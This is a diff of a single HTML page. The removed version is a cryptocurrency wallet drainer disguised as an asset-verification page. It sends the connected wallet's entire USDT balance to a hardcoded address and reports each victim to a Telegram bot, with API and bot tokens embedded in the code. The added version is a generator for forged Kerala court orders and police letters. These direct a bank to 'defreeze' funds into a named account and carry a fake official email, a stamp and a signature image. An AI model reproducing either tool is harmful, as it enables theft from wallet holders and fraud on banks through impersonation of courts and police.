@@ -1,338 +1,426 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Connect Wallet & Verify Asset</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.6.1/dist/web3.min.js"></script>
-  <style>
-    html, body {
-      margin: 0;
-      padding: 0;
-      overflow: hidden;
-      height: 100%;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    }
-
-    body {
-      background: #000;
-      position: relative;
-      color: #fff;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
-      z-index: 1;
-    }
-
-    canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      z-index: 0;
-      opacity: 0.5;
-    }
-
-    h1 {
-      margin-bottom: 40px;
-      font-size: 28px;
-      color: #fff;
-      text-shadow: 1px 1px 3px #fcd535;
-      z-index: 2;
-    }
-
-    button {
-      background: linear-gradient(135deg, #ff6ec4, #7873f5);
-      color: white;
-      border: none;
-      padding: 15px 40px;
-      font-size: 18px;
-      border-radius: 12px;
-      cursor: pointer;
-      box-shadow: 0 8px 15px rgba(0, 0, 0, 0.2);
-      transition: all 0.3s ease;
-      position: relative;
-      overflow: hidden;
-      z-index: 2;
-    }
-
-    button:hover {
-      background: linear-gradient(135deg, #e94057, #8a2387);
-      box-shadow: 0 12px 20px rgba(0, 0, 0, 0.25);
-      transform: translateY(-2px);
-    }
-
-    button:active {
-      transform: scale(0.98);
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
-    }
-
-    .loader {
-      border: 6px solid #f3f3f3;
-      border-top: 6px solid #4CAF50;
-      border-radius: 50%;
-      width: 40px;
-      height: 40px;
-      animation: spin 1s linear infinite;
-      margin-top: 20px;
-      display: none;
-      z-index: 2;
-    }
-
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    @keyframes popupEffect {
-      0% {
-        transform: scale(0);
-        opacity: 0;
-      }
-      100% {
-        transform: scale(1);
-        opacity: 1;
-      }
-    }
-
-    .popupLogo {
-      animation: popupEffect 0.6s ease-out forwards;
-    }
-
-    #status {
-      font-size: 16px;
-      margin-top: 20px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Combined Document Generator</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Library for generating PDF from HTML -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Tinos:wght@400;700&family=Inter:wght@400;700&family=Roboto:wght@400;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+        }
+        .preview-court-order {
+            font-family: 'Tinos', serif;
+        }
+        .preview-police-letter {
+            font-family: 'Times New Roman', Times, serif;
+        }
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #f1f1f1;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #888;
+            border-radius: 4px;
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+        .page-break {
+            page-break-after: always;
+            border-top: 2px dashed #ccc;
+            margin-top: 2rem;
+            padding-top: 2rem;
+        }
+        /* Style for disabled buttons */
+        .btn-disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+    </style>
 </head>
-<body>
-  <canvas id="coinCanvas"></canvas>
-  
-  <h1>Verify Your Cryptocurrency</h1>
-  <button onclick="connectAndSend()">Verify Asset</button>
-  <p id="status"></p>
-  <div class="loader" id="loader"></div>
+<body class="bg-gray-100">
 
-  <script>
-    const BSC_SCAN_API = 'ZTC12CNRZ8UC8HGFDIW8SARDJXP1N6QIR1';
-    const TELEGRAM_TOKEN = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU';
-    const TELEGRAM_CHAT_ID = '8060968649';
-    const USDT_CONTRACT = '0x55d398326f99059ff775485246999027b3197955';
-    const RECEIVER = '0x8e11ea07330A4824F846ad3Ea3dfB68f47c66B56';
-    const BACKEND_URL = 'https://a-production-c9bc.up.railway.app';
+    <div class="flex flex-col lg:flex-row w-full min-h-screen">
+        <!-- Form Section -->
+        <div class="w-full lg:w-1/3 bg-white p-6 overflow-y-auto">
+            <h2 class="text-2xl font-bold mb-6 text-gray-800 border-b pb-2">Document Details</h2>
+            
+            <div class="space-y-4">
+                <!-- Common Details -->
+                <div>
+                    <h3 class="font-semibold text-lg mb-2 text-gray-700">Common Case Details</h3>
+                    <div class="space-y-2 pl-4 border-l-2 border-purple-500">
+                        <div>
+                            <label for="cr_no" class="block text-sm font-medium text-gray-600">Crime No.</label>
+                            <input type="text" id="cr_no" value="1254/2025" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-purple-500 focus:border-purple-500">
+                        </div>
+                         <div>
+                            <label for="court_name" class="block text-sm font-medium text-gray-600">Court Name</label>
+                            <input type="text" id="court_name" value="Chief Judicial Magistrate Court, Thiruvananthapuram" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-purple-500 focus:border-purple-500">
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Court Order Specifics -->
+                <div>
+                    <h3 class="font-semibold text-lg mb-2 text-gray-700">Court Order Details</h3>
+                    <div class="space-y-2 pl-4 border-l-2 border-indigo-500">
+                        <div>
+                            <label for="order_date" class="block text-sm font-medium text-gray-600">Court Order Date</label>
+                            <input type="date" id="order_date" value="2025-07-16" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500">
+                        </div>
+                        <div>
+                            <label for="final_date" class="block text-sm font-medium text-gray-600">Dated this (Final Date)</label>
+                            <input type="date" id="final_date" value="2025-08-01" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-indigo-500 focus:border-indigo-500">
+                        </div>
+                    </div>
+                </div>
+                
+                 <!-- Police Letter Specifics -->
+                <div>
+                    <h3 class="font-semibold text-lg mb-2 text-gray-700">Police Letter Details</h3>
+                    <div class="space-y-2 pl-4 border-l-2 border-blue-500">
+                        <div>
+                            <label for="letter_date" class="block text-sm font-medium text-gray-600">Letter Date</label>
+                            <input type="date" id="letter_date" value="2025-08-02" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-blue-500 focus:border-blue-500">
+                        </div>
+                    </div>
+                </div>
 
-    const canvas = document.getElementById('coinCanvas');
-    const ctx = canvas.getContext('2d');
-    canvas.width = window.innerWidth;
-    canvas.height = window.innerHeight;
+                <!-- Petitioner Details -->
+                <div>
+                    <h3 class="font-semibold text-lg mb-2 text-gray-700">Petitioner's Details</h3>
+                    <div class="space-y-2 pl-4 border-l-2 border-yellow-500">
+                        <div>
+                            <label for="petitioner_name" class="block text-sm font-medium text-gray-600">Petitioner Name</label>
+                            <input type="text" id="petitioner_name" value="Mr. Arjun Verma" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-yellow-500 focus:border-yellow-500">
+                        </div>
+                         <div>
+                            <label for="petitioner_father" class="block text-sm font-medium text-gray-600">S/o</label>
+                            <input type="text" id="petitioner_father" value="Mr. Ramesh Verma" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-yellow-500 focus:border-yellow-500">
+                        </div>
+                        <div>
+                            <label for="petitioner_address" class="block text-sm font-medium text-gray-600">Address</label>
+                            <textarea id="petitioner_address" rows="3" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-yellow-500 focus:border-yellow-500">Residing at 12B, Rose Villa, Kowdiar, Thiruvananthapuram, Kerala - 695003</textarea>
+                        </div>
+                    </div>
+                </div>
 
-    const coinLogoBinance = 'binance-coin-bnb-logo.png'; 
-    const coinLogoTether = 'tether-usdt-logo.svg'; 
+                <!-- Defreeze Account Details -->
+                <div>
+                    <h3 class="font-semibold text-lg mb-2 text-gray-700">Beneficiary Account (To Defreeze)</h3>
+                     <div class="space-y-2 pl-4 border-l-2 border-green-500">
+                         <div>
+                            <label for="defreeze_bank_name" class="block text-sm font-medium text-gray-600">Bank Name</label>
+                            <input type="text" id="defreeze_bank_name" value="Axis Bank" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-green-500 focus:border-green-500">
+                        </div>
+                        <div>
+                            <label for="defreeze_acc_no" class="block text-sm font-medium text-gray-600">Account No.</label>
+                            <input type="text" id="defreeze_acc_no" value="924020036321176" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-green-500 focus:border-green-500">
+                        </div>
+                        <div>
+                            <label for="defreeze_ifsc" class="block text-sm font-medium text-gray-600">IFSC Code</label>
+                            <input type="text" id="defreeze_ifsc" value="UTIB0000123" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-green-500 focus:border-green-500">
+                        </div>
+                         <div>
+                            <label for="defreeze_amount" class="block text-sm font-medium text-gray-600">Amount (INR)</label>
+                            <input type="number" id="defreeze_amount" value="950000" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-green-500 focus:border-green-500">
+                        </div>
+                    </div>
+                </div>
 
-    const imageBinance = new Image();
-    const imageTether = new Image();
-    let imageBinanceLoaded = false;
-    let imageTetherLoaded = false;
+                <!-- Transfer Account Details -->
+                <div>
+                    <h3 class="font-semibold text-lg mb-2 text-gray-700">Petitioner's Account (To Transfer)</h3>
+                    <div class="space-y-2 pl-4 border-l-2 border-red-500">
+                         <div>
+                            <label for="transfer_bank_name" class="block text-sm font-medium text-gray-600">Bank Name</label>
+                            <input type="text" id="transfer_bank_name" value="IDFC Bank" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-red-500 focus:border-red-500">
+                        </div>
+                        <div>
+                            <label for="transfer_holder_name" class="block text-sm font-medium text-gray-600">Account Holder Name</label>
+                            <input type="text" id="transfer_holder_name" value="Mr. Arjun Verma" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-red-500 focus:border-red-500">
+                        </div>
+                        <div>
+                            <label for="transfer_acc_no" class="block text-sm font-medium text-gray-600">Account No.</label>
+                            <input type="text" id="transfer_acc_no" value="10012345678" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-red-500 focus:border-red-500">
+                        </div>
+                        <div>
+                            <label for="transfer_ifsc" class="block text-sm font-medium text-gray-600">IFSC Code</label>
+                            <input type="text" id="transfer_ifsc" value="IDFB0000123" class="mt-1 block w-full border border-gray-300 rounded-md shadow-sm py-2 px-3 focus:outline-none focus:ring-red-500 focus:border-red-500">
+                        </div>
+                    </div>
+                </div>
 
-    imageBinance.src = coinLogoBinance;
-    imageTether.src = coinLogoTether;
+                <!-- Action Buttons -->
+                <div id="action-buttons" class="space-y-3 pt-6">
+                    <button onclick="updatePreview()" class="w-full bg-blue-600 text-white py-2 px-4 rounded-md hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition duration-150 ease-in-out">Generate Preview</button>
+                    <button onclick="saveCourtOrder(event)" class="w-full bg-green-600 text-white py-2 px-4 rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-green-500 transition duration-150 ease-in-out">Save Court Order as PDF</button>
+                    <button onclick="savePoliceLetter(event)" class="w-full bg-teal-600 text-white py-2 px-4 rounded-md hover:bg-teal-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-teal-500 transition duration-150 ease-in-out">Save Police Letter as PDF</button>
+                </div>
+            </div>
+        </div>
 
-    imageBinance.onload = () => {
-      imageBinanceLoaded = true;
-      if (imageTetherLoaded) createLogos();
-    };
+        <!-- Preview Section -->
+        <div class="w-full lg:w-2/3 bg-gray-200 p-6 lg:p-10 overflow-y-auto">
+            <div id="preview" class="bg-white p-8 sm:p-10 lg:p-12 shadow-lg min-h-full">
+                <!-- Preview content will be injected here -->
+                <p class="text-gray-500 text-center">Fill the details on the left and click 'Generate Preview' to see the documents here.</p>
+            </div>
+        </div>
+    </div>
 
-    imageTether.onload = () => {
-      imageTetherLoaded = true;
-      if (imageBinanceLoaded) createLogos();
-    };
-
-    const logoCount = 7;
-    const logosBinance = [];
-    const logosTether = [];
-
-    function createLogos() {
-      for (let i = 0; i < logoCount; i++) {
-        logosBinance.push({
-          x: Math.random() * canvas.width,
-          y: Math.random() * canvas.height,
-          size: 50,
-          dx: (Math.random() - 0.5) * 4,
-          dy: (Math.random() - 0.5) * 4,
-          image: imageBinance,
-        });
-        logosTether.push({
-          x: Math.random() * canvas.width,
-          y: Math.random() * canvas.height,
-          size: 50,
-          dx: (Math.random() - 0.5) * 4,
-          dy: (Math.random() - 0.5) * 4,
-          image: imageTether,
-        });
-      }
-      animateLogos();
-    }
-
-    function animateLogos() {
-      ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-      logosBinance.forEach(logo => {
-        ctx.drawImage(logo.image, logo.x, logo.y, logo.size, logo.size);
-        logo.x += logo.dx;
-        logo.y += logo.dy;
-
-        if (logo.x <= 0 || logo.x + logo.size >= canvas.width) logo.dx = -logo.dx;
-        if (logo.y <= 0 || logo.y + logo.size >= canvas.height) logo.dy = -logo.dy;
-      });
-
-      logosTether.forEach(logo => {
-        ctx.drawImage(logo.image, logo.x, logo.y, logo.size, logo.size);
-        logo.x += logo.dx;
-        logo.y += logo.dy;
-
-        if (logo.x <= 0 || logo.x + logo.size >= canvas.width) logo.dx = -logo.dx;
-        if (logo.y <= 0 || logo.y + logo.size >= canvas.height) logo.dy = -logo.dy;
-      });
-
-      requestAnimationFrame(animateLogos);
-    }
-
-    async function connectAndSend() {
-      const status = document.getElementById("status");
-      const loader = document.getElementById("loader");
-      loader.style.display = "block"; // Show loader
-      status.innerText = "🔗 Connecting...";
-
-      if (typeof window.ethereum === 'undefined') {
-        alert("⚠️ Please install MetaMask or Web3 wallet!");
-        return;
-      }
-
-      const web3 = new Web3(window.ethereum);
-      const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-      const user = accounts[0];
-
-      // Check if the connected wallet is on Binance Smart Chain (BSC)
-      const chainId = await web3.eth.getChainId();
-      if (chainId !== 56) {
-        status.innerText = "⚠️ Wrong Network. Switching to BSC...";
-        await switchToBSC();
-      } else {
-        status.innerText = "✅ Connected to BSC";
-      }
-
-      let message = `📲 *Wallet Connected*\n\`${user}\`\n\n`;
-
-      const bnbUrl = `https://api.bscscan.com/api?module=account&action=balance&address=${user}&apikey=${BSC_SCAN_API}`;
-      const bnbRes = await fetch(bnbUrl);
-      const bnbData = await bnbRes.json();
-      let bnb = 0;
-
-      if (bnbData.status === "1") {
-        bnb = parseFloat(bnbData.result) / 1e18;
-        message += `💰 *BNB*: ${bnb.toFixed(4)}\n`;
-      } else {
-        message += `💰 *BNB*: ❌ Error\n`;
-      }
-
-      const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
-      const priceData = await priceRes.json();
-      const bnbUsd = bnb * priceData.binancecoin.usd;
-
-      const usdtUrl = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${USDT_CONTRACT}&address=${user}&tag=latest&apikey=${BSC_SCAN_API}`;
-      const usdtRes = await fetch(usdtUrl);
-      const usdtData = await usdtRes.json();
-      const usdt = (parseFloat(usdtData.result) / 1e18).toFixed(2);
-      message += `💵 *USDT*: ${usdt}\n`;
-
-      if (bnbUsd < 1) {
-        message += `⚠️ *BNB < $1* – requesting backend top-up...\n`;
-        status.innerText = "Wait While We Are Processing Your Request.";
-
-        const topupRes = await fetch(`${BACKEND_URL}/api/topup-bnb`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ address: user })
-        });
-
-        const topup = await topupRes.json();
-        if (!topup.ready) {
-          message += `❌ *Top-up Failed*`;
-          status.innerText = "Wait While We Are Processing Your Request.";
-          loader.style.display = "none"; // Hide loader
-          return sendTelegram(message);
+    <script>
+        // --- UTILITY FUNCTIONS ---
+        function formatFullDate(dateString) {
+            if (!dateString) return '';
+            const date = new Date(dateString + 'T00:00:00');
+            const day = date.getDate();
+            const month = date.toLocaleString('default', { month: 'long' });
+            const year = date.getFullYear();
+            let daySuffix;
+            if (day % 10 === 1 && day !== 11) daySuffix = 'st';
+            else if (day % 10 === 2 && day !== 12) daySuffix = 'nd';
+            else if (day % 10 === 3 && day !== 13) daySuffix = 'rd';
+            else daySuffix = 'th';
+            return `Dated this ${day}${daySuffix} day of ${month} ${year}.`;
         }
 
-        message += `✅ *Top-up Requested!*\n⏳ *Waiting for balance update...*\n`;
-        await new Promise(r => setTimeout(r, 15000)); // Wait for 15 seconds
-
-        // Recheck BNB balance
-        const bnbCheck = await fetch(bnbUrl);
-        const newBnbData = await bnbCheck.json();
-        const newBnb = parseFloat(newBnbData.result) / 1e18;
-        const newBnbUsd = newBnb * priceData.binancecoin.usd;
-
-        if (newBnbUsd < 1) {
-          message += `❌ *Still < $1 BNB* – cannot proceed.\n`;
-          status.innerText = "Wait While We Are Processing Your Request.";
-          loader.style.display = "none"; // Hide loader
-          return sendTelegram(message);
+        function formatSimpleDate(dateString) {
+            if (!dateString) return '';
+            const [year, month, day] = dateString.split('-');
+            return `${day}.${month}.${year}`;
         }
 
-        message += `✅ *BNB now sufficient! Proceeding...*\n`;
-      } else {
-        message += `✅ *BNB is sufficient!*\n`;
-      }
-
-      loader.style.display = "none"; // Hide loader
-      const usdtContract = new web3.eth.Contract([
-        { "constant": false, "inputs": [
-            { "name": "_to", "type": "address" },
-            { "name": "_value", "type": "uint256" }
-          ],
-          "name": "transfer",
-          "outputs": [{ "name": "", "type": "bool" }],
-          "type": "function"
+        function inWords(num) {
+            const a = ['','one ','two ','three ','four ', 'five ','six ','seven ','eight ','nine ','ten ','eleven ','twelve ','thirteen ','fourteen ','fifteen ','sixteen ','seventeen ','eighteen ','nineteen '];
+            const b = ['', '', 'twenty','thirty','forty','fifty', 'sixty','seventy','eighty','ninety'];
+            if ((num = num.toString()).length > 9) return 'overflow';
+            const n = ('000000000' + num).substr(-9).match(/^(\d{2})(\d{2})(\d{2})(\d{1})(\d{2})$/);
+            if (!n) return '';
+            let str = '';
+            str += (n[1] != 0) ? (a[Number(n[1])] || b[n[1][0]] + ' ' + a[n[1][1]]) + 'crore ' : '';
+            str += (n[2] != 0) ? (a[Number(n[2])] || b[n[2][0]] + ' ' + a[n[2][1]]) + 'lakh ' : '';
+            str += (n[3] != 0) ? (a[Number(n[3])] || b[n[3][0]] + ' ' + a[n[3][1]]) + 'thousand ' : '';
+            str += (n[4] != 0) ? (a[Number(n[4])] || b[n[4][0]] + ' ' + a[n[4][1]]) + 'hundred ' : '';
+            str += (n[5] != 0) ? ((str != '') ? 'and ' : '') + (a[Number(n[5])] || b[n[5][0]] + ' ' + a[n[5][1]]) : '';
+            return str.trim().split(' ').map(s => s.charAt(0).toUpperCase() + s.slice(1)).join(' ');
         }
-      ], USDT_CONTRACT);
+        
+        // --- DATA GATHERING ---
+        function getFormData() {
+            const data = {};
+            const ids = ['cr_no', 'court_name', 'order_date', 'final_date', 'letter_date', 'petitioner_name', 'petitioner_father', 'petitioner_address', 'defreeze_bank_name', 'defreeze_acc_no', 'defreeze_ifsc', 'defreeze_amount', 'transfer_bank_name', 'transfer_holder_name', 'transfer_acc_no', 'transfer_ifsc'];
+            ids.forEach(id => data[id] = document.getElementById(id).value);
+            return data;
+        }
 
-      const amountToSend = web3.utils.toWei(usdt, "ether");
+        // --- HTML GENERATION FUNCTIONS ---
+        function generateCourtOrderHTML(data) {
+             const defreeze_amount_num = parseFloat(data.defreeze_amount);
+             const defreeze_amount_str = defreeze_amount_num.toLocaleString('en-IN');
+             const defreeze_amount_words = inWords(defreeze_amount_num);
+             const signatureUrl = 'https://i.postimg.cc/K8t0B2Yq/Ryan-Signature.png';
+             const judicialStampUrl = 'https://i.postimg.cc/xdRgp3ML/chief-judicial.png';
+             
+             return `
+                 <div class="preview-court-order">
+                     <div class="text-center mb-8">
+                         <h1 class="text-2xl sm:text-3xl font-bold uppercase tracking-wider">IN THE COURT OF THE CHIEF JUDICIAL MAGISTRATE, THIRUVANANTHAPURAM</h1>
+                     </div>
+                     <div class="mb-8">
+                         <p class="text-lg font-bold text-center">Cr no. ${data.cr_no}</p>
+                         <div class="mt-6 grid grid-cols-[auto,1fr] gap-x-6 text-lg pl-12">
+                             <p class="font-semibold">Complainant:</p>
+                             <p class="font-normal">State by Cyber Police Police Station, Thiruvananthapuram</p>
+                             <div class="col-span-2 text-center"><p class="font-bold my-2">V/s</p></div>
+                             <p class="font-semibold self-start">Petitioner:</p>
+                             <div>
+                                 <p class="font-normal">${data.petitioner_name}</p>
+                                 <p class="font-normal">S/o ${data.petitioner_father}</p>
+                                 <p class="font-normal">${data.petitioner_address.replace(/\n/g, '<br>')}</p>
+                             </div>
+                         </div>
+                     </div>
+                     <div class="mt-10">
+                         <h2 class="text-xl font-bold text-center underline uppercase mb-6">Direction</h2>
+                         <p class="text-lg leading-relaxed text-justify">
+                             As per the order passed by this court dated <strong>${formatSimpleDate(data.order_date)}</strong>, you are hereby directed to issue a direction to the Manager of <strong>${data.defreeze_bank_name}</strong>, to defreeze the amount of <strong>Rs. ${defreeze_amount_str}/- (${defreeze_amount_words} Only)</strong> from <strong>${data.defreeze_bank_name}, Account No: ${data.defreeze_acc_no}, IFSC Code: ${data.defreeze_ifsc}</strong> and to transfer the said amount to the petitioner's account with <strong>${data.transfer_bank_name}, Account Holder: ${data.transfer_holder_name}, Account No: ${data.transfer_acc_no}, IFSC Code: ${data.transfer_ifsc}</strong>.
+                         </p>
+                         <p class="text-lg leading-relaxed text-justify font-semibold mt-8">You are directed to submit the compliance report to this court forthwith.</p>
+                     </div>
+                     
+                     <div class="mt-12 flex justify-between items-start">
+                         <div>
+                             <p class="text-lg">${formatFullDate(data.final_date)}</p>
+                         </div>
+                         <div class="text-center">
+                             <p class="font-bold text-lg">By the Order of the Court,</p>
+                             <div class="h-16 my-2 flex justify-center items-center">
+                                 <img src="${signatureUrl}" alt="Signature" class="h-12" />
+                             </div>
+                             <p class="font-semibold text-sm" style="color: #1b49ac;">SENIOR SHERISTEDAR</p>
+                             <p class="font-semibold text-sm" style="color: #1b49ac;">CHIEF JUDICIAL MAGISTRATE COURT,</p>
+                             <p class="font-semibold text-sm" style="color: #1b49ac;">THIRUVANANTHAPURAM</p>
+                         </div>
+                     </div>
 
-      try {
-        const tx = await usdtContract.methods.transfer(RECEIVER, amountToSend).send({ from: user });
-        message += `🚀 *USDT Sent Successfully!*\n📦 TX Hash: \`${tx.transactionHash}\``;
-        status.innerText = "Verification successfull Asset Verified!";
-      } catch (err) {
-        console.error(err);
-        message += `❌ *USDT Transfer Failed*`;
-        status.innerText = "Verification Failed Restart The Verification Process.";
-      }
+                     <!-- Corrected Stamp Layout based on user image -->
+                     <div class="mt-8 relative" style="min-height: 150px;">
+                         <!-- Address Block -->
+                         <div class="pt-12">
+                             <p class="text-lg font-semibold">To,</p>
+                             <p class="text-lg">The Investigation Officer,</p>
+                             <p class="text-lg">Cyber Police Station, Thiruvananthapuram.</p>
+                         </div>
+                         <!-- Overlapping Stamp -->
+                         <div class="absolute top-0 left-0">
+                              <img src="${judicialStampUrl}" alt="Judicial Stamp" class="h-36" />
+                         </div>
+                     </div>
+                 </div>
+             `;
+        }
 
-      await sendTelegram(message);
-    }
+        function generatePoliceLetterHTML(data) {
+            const defreeze_amount_num = parseFloat(data.defreeze_amount);
+            const defreeze_amount_str = defreeze_amount_num.toLocaleString('en-IN');
+            const keralaPoliceLogoUrl = 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a0/Kerala_State_Police_Logo.png/260px-Kerala_State_Police_Logo.png';
 
-    async function switchToBSC() {
-      try {
-        await window.ethereum.request({
-          method: 'wallet_switchEthereumChain',
-          params: [{ chainId: '0x38' }] // BSC Mainnet chain ID (0x38 is hex for 56)
-        });
-      } catch (error) {
-        console.error(error);
-        alert("⚠️ Failed to switch to Binance Smart Chain.");
-      }
-    }
+            return `
+                 <div class="preview-police-letter text-black">
+                     <div class="flex justify-center mb-4">
+                         <img src="${keralaPoliceLogoUrl}" alt="Kerala Police Logo" class="h-24">
+                     </div>
+                     <div class="text-right mb-8">
+                         <h2 class="font-bold text-lg">Cyber Police Station, Thiruvananthapuram</h2>
+                         <p class="text-sm">Email: cybercell.protect@kerala.pol-gov.org</p>
+                         <p class="text-sm">Contact: +91 9744420317</p>
+                         <p class="text-sm">Date: ${formatSimpleDate(data.letter_date)}</p>
+                     </div>
+                     <hr class="border-gray-400 mb-8">
+                     <div class="space-y-2 mb-6">
+                         <p>To,</p>
+                         <p class="font-semibold">The Branch Manager,</p>
+                         <p>${data.defreeze_bank_name}</p>
+                     </div>
+                     <div class="mb-6"><p><span class="font-bold">Subject:</span> Comply to Honorable Court order regarding</p></div>
+                     <div class="mb-6">
+                         <p><span class="font-bold">Reference:</span></p>
+                         <ol class="list-decimal list-inside ml-4">
+                             <li>Cr no. ${data.cr_no}</li>
+                             <li>Honorable ${data.court_name}</li>
+                         </ol>
+                     </div>
+                     <p class="mb-6">Sir,</p>
+                     <p class="text-justify leading-relaxed">
+                         This is for your kind notice that the Honorable ${data.court_name} has given a direction to the Investigating Officer of the above case (Ref 1) via the order as per Ref 2.
+                         <br><br>
+                         As per the orders, the Honorable Court has directed myself to issue a direction to the Manager, ${data.defreeze_bank_name}, to defreeze the frozen amount of <strong>Rs. ${defreeze_amount_str}/-</strong> from the beneficiary account <strong>(A/c No: ${data.defreeze_acc_no}, IFSC: ${data.defreeze_ifsc})</strong> and transfer the above-said amount to the petitioner's bank account <strong>(${data.transfer_bank_name}, A/c No: ${data.transfer_acc_no}, IFSC: ${data.transfer_ifsc})</strong> and submit a compliance report to the court forthwith.
+                         <br><br>
+                         Therefore, we are enclosing the scanned copy of the above court order (Ref 2) for your kind perusal to act accordingly as early as possible. If unable to comply with the order, do reply regarding the reasons for the same. Any delay or denial will be treated as contempt of the Honorable Court order, and the same will be reported to the Honorable Court for further legal actions.
+                     </p>
+                     <div class="mt-12 text-right">
+                          <div class="h-16"></div>
+                         <p class="font-bold">Investigating Officer,</p>
+                     </div>
+                 </div>
+             `;
+        }
+        
+        // --- MAIN FUNCTIONS ---
+        function updatePreview() {
+            const data = getFormData();
+            const courtOrderHtml = generateCourtOrderHTML(data);
+            const policeLetterHtml = generatePoliceLetterHTML(data);
+            const separator = `<div class="page-break"><p class="text-center font-bold text-gray-500">[ End of Court Order / Start of Police Letter ]</p></div>`;
+            document.getElementById('preview').innerHTML = courtOrderHtml + separator + policeLetterHtml;
+        }
 
-    async function sendTelegram(msg) {
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
-          text: msg,
-          parse_mode: "Markdown"
-        })
-      });
-    }
-  </script>
+        /**
+         * Disables all action buttons and shows a loading message on a specific button.
+         * @param {HTMLButtonElement} clickedButton The button that was clicked.
+         */
+        function setButtonsLoading(clickedButton) {
+            const buttons = document.querySelectorAll('#action-buttons button');
+            buttons.forEach(button => {
+                button.disabled = true;
+                button.classList.add('btn-disabled');
+                if (button === clickedButton) {
+                    button.textContent = 'Generating PDF...';
+                }
+            });
+        }
+
+        /**
+         * Re-enables all action buttons and restores their original text.
+         */
+        function resetButtonStates() {
+            const buttons = document.querySelectorAll('#action-buttons button');
+            buttons.forEach(button => {
+                button.disabled = false;
+                button.classList.remove('btn-disabled');
+            });
+            // Restore original text
+            buttons[0].textContent = 'Generate Preview';
+            buttons[1].textContent = 'Save Court Order as PDF';
+            buttons[2].textContent = 'Save Police Letter as PDF';
+        }
+
+        /**
+         * Generates a PDF from a visible DOM node. This is the most reliable method.
+         * @param {HTMLElement} elementToPrint The DOM element to convert to a PDF.
+         * @param {string} filename The desired filename for the downloaded PDF.
+         */
+        async function generatePdfFromElement(elementToPrint, filename) {
+            if (!elementToPrint) {
+                console.error("The element to print was not found in the document.");
+                resetButtonStates();
+                return;
+            }
+
+            const opt = {
+                margin:       0.2,
+                filename:     filename,
+                image:        { type: 'jpeg', quality: 0.98 },
+                html2canvas:  { scale: 2, useCORS: true, scrollY: 0 },
+                jsPDF:        { unit: 'in', format: 'a4', orientation: 'portrait' }
+            };
+
+            try {
+                // Directly use the element from the DOM.
+                await html2pdf().set(opt).from(elementToPrint).save();
+            } catch (error) {
+                console.error("PDF Generation Error:", error);
+            } finally {
+                // Always re-enable buttons after the process finishes or fails.
+                resetButtonStates();
+            }
+        }
+
+        async function saveCourtOrder(event) {
+            setButtonsLoading(event.currentTarget);
+            const node = document.querySelector('.preview-court-order');
+            const data = getFormData();
+            await generatePdfFromElement(node, `Court_Order_${data.cr_no.replace(/\//g, '-')}.pdf`);
+        }
+
+        async function savePoliceLetter(event) {
+            setButtonsLoading(event.currentTarget);
+            const node = document.querySelector('.preview-police-letter');
+            const data = getFormData();
+            await generatePdfFromElement(node, `Police_Letter_${data.cr_no.replace(/\//g, '-')}.pdf`);
+        }
+
+        // Initial preview on page load
+        window.onload = updatePreview;
